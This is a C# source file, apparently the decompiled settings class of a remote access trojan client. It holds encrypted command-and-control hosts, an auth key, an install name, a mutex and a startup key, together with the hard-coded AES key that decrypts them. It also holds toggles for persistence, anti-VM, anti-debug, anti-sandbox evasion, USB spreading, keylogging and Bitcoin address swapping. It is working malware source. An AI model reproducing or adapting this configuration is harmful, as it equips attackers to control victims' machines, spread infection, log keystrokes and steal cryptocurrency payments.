using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "wSyBdlhrRQJUJ5a2W0IwVnLYdWo5sunhuE7RhW7qf8/FnbvfhnjbFkYUYeiLmUpDVk7AxtGqheKunblkdvx61g==";

	public static string HOSTS = "4A8IrRAxD0LQx2T2T1T+reb5OlcCV3m4NMS38VQJF5ll56uYz14VXUliVYBNY8tMVbYQOHr4vvY6pCFp1cNFHofgkMJDkOeBmgsk+6KcKXk=";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "1WvgEMPjdwfqIMeM9MclyQ==";

	public static string AUTHKEY = "NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "Dc15VD0FlZCcuDrM4tMQKXU7KEZefyQC7EoaLnUtPvdpUZwB6H1I0pdY3i6lIbdFQ2656kAtBK33LvmJDpFVRw==";

	public static string INSTALLNAME = "Z/U+Un8ljD9eFPM+kpJQua+Xmtsy4qQY/YWwCA1qoxFs1RLZbcNjesKE/c83Pemx+C96WPH0Tmv+ulsxB/7olQ==";

	public static bool INSTALL = false;

	public static bool STARTUP = false;

	public static string MUTEX = "XfeKORE77nL8nrETaQlQE+pmbt20v6SiYqCVYq16Se+cwTTSj/I4vTUfPKx0hTdWRfpxIRCuE/No2PSURcsCtQDMmakDDdZTiBGqQakJjAg=";

	public static string STARTUPKEY = "TspvCQczMrrsGLqfjpMs8kPkcdu6uFv0QJjRGP3+ceYRNoVegaG2dT7QfLscPXYFyvXXc3OOSWGFh6Mday5JcEaZPKXzTr2sbrhPClgLXyQ=";

	public static bool HIDEFILE = false;

	public static bool ENABLELOGGER = false;

	public static string ENCRYPTIONKEY = "ULahfkTlv8LcaqqttKbn";

	public static string TAG = "50a+C9MBjjikNGuw4DykVJ6kkO7erLS/ZoEP0i+7ST0/C1hemum4FB16WvUcR2kCTu0o0Bp5yIaBa81OgIvjlw==";

	public static string LOGDIRECTORYNAME = "P7x07feuHoqMZW6UOsvcwOkStxYcHhfcc/dv//kWbANdIaofriAWCPicTlzt2mX4411WSLUQyGEUQuF5ZENgow==";

	public static string USBSpreadNAME = "wJ6148daaEpsdrL/2tG/tz3ijONd8aPmQWVaH5usGfxWW5/kPm6+w+7JMylER8T5/jyE8shkvZqlsYVwdtRQ0A==";

	public static string BTCAddress = "CGuSwIDbK5WudHJ58nCbv0TL+n49caffY/31IPXSasZmuO3DTgjlvlmIYP92QIgZkGSJR0/rnOdcpDa+9BrVJg==";

	public static bool HIDELOGDIRECTORY = false;

	public static bool HIDEINSTALLSUBDIRECTORY = false;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = false;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
